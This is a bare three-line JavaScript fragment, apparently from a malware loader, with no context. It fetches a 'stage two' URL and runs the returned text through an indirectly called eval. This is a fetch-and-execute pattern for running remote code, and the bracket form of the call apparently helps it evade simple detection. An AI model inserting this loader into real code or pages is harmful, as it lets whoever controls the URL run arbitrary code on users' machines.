fetch(stageTwoUrl)
  .then((response) => response.text())
  .then((jsContent) => { window["eval"](jsContent); });
